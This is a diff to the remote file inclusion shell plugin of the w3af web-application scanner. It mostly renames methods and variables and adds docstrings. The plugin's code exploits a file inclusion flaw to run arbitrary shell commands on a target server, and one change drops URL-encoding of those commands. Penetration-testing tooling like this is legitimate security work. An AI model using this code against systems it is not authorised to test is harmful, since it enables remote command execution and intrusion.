@@ -132,11 +132,11 @@ class remoteFileIncludeShell(baseAttackPlugin):
         # Check if we really can execute commands on the remote server
         if self._verifyVuln( vuln ):
             # Create the shell object
-            s = rfiShell( vuln )
+            s = rfi_shell( vuln )
             s.setUrlOpener( self._urlOpener )
             s.setCut( self._header, self._footer )
             s.setWebServer( self._web_server )
-            s.setExploitDc( self._exploitDc )
+            s.setExploitDc( self._exploit_dc )
             return s
         else:
             return None
@@ -173,13 +173,13 @@ class remoteFileIncludeShell(baseAttackPlugin):
                 successfully_exploited = False
             else:
                 successfully_exploited = self._defineCut( http_res.getBody(), 'w3af' , exact=True )
-            
+
             if successfully_exploited:
-                self._exploitDc = dc
+                self._exploit_dc = dc
                 return successfully_exploited
             else:
                 # Remove the file from the local webserver webroot
-                self._clearWebServer( url_to_include )
+                self._clear_web_server( url_to_include )
                 
         return False
     
@@ -209,7 +209,7 @@ class remoteFileIncludeShell(baseAttackPlugin):
                 url_to_include += str(self._listen_port) +'/' + filename
                 return url_to_include
     
-    def _clearWebServer( self, url_to_include ):
+    def _clear_web_server( self, url_to_include ):
         '''
         Remove the file in the webroot and stop the webserver.
         '''
@@ -310,15 +310,28 @@ class remoteFileIncludeShell(baseAttackPlugin):
             - generateOnlyOne
         '''
         
-class rfiShell(shell):
-    def setExploitDc( self, eDc ):
-        self._exploitDc = eDc
+class rfi_shell(shell):
+    def setExploitDc( self, e_dc ):
+        '''
+        Save the exploit data container, that holds all the parameters for a successful exploitation
+        
+        @parameter e_dc: The exploit data container.
+        '''
+        self._exploit_dc = e_dc
     
     def getExploitDc( self ):
-        return self._exploitDc
+        '''
+        Get the exploit data container.
+        '''
+        return self._exploit_dc
     
-    def setWebServer( self, webserverInstance ):
-        self._web_server = webserverInstance
+    def setWebServer( self, webserver_instance ):
+        '''
+        Set the web server instance to use
+        
+        @parameter webserver_instance: The obj.
+        '''
+        self._web_server = webserver_instance
     
     def _rexec( self, command ):
         '''
@@ -328,13 +341,13 @@ class rfiShell(shell):
         @parameter command: The command to send ( ie. "ls", "whoami", etc ).
         @return: The result of the command.
         '''
-        eDc = self.getExploitDc()
-        eDc = eDc.copy()
-        eDc[ 'cmd' ] = urllib.quote_plus( command )
+        e_dc = self.getExploitDc()
+        e_dc = e_dc.copy()
+        e_dc[ 'cmd' ] = command
         
         functionReference = getattr( self._urlOpener , self.getMethod() )
         try:
-            http_res = functionReference( self.getURL(), str(eDc) )
+            http_res = functionReference( self.getURL(), str(e_dc) )
         except w3afException, w3:
             return 'Exception from the remote web application:' + str(w3)
         except Exception, e:
@@ -345,16 +358,16 @@ class rfiShell(shell):
     def end( self ):
         om.out.debug('Remote file inclusion shell is cleaning up.')
         try:
-            self._clearWebServer( self.getExploitDc()[ self.getVar() ] )
+            self._clear_web_server( self.getExploitDc()[ self.getVar() ] )
         except Exception, e:
             om.out.error('Remote file inclusion shell cleanup failed with exception: ' + str(e) )
         else:
             om.out.debug('Remote file inclusion shell cleanup complete.')
     
     def getName( self ):
-        return 'rfiShell'
+        return 'rfi_shell'
 
-    def _clearWebServer( self, url_to_include ):
+    def _clear_web_server( self, url_to_include ):
         '''
         TODO: This is duplicated code!! see above.
         '''
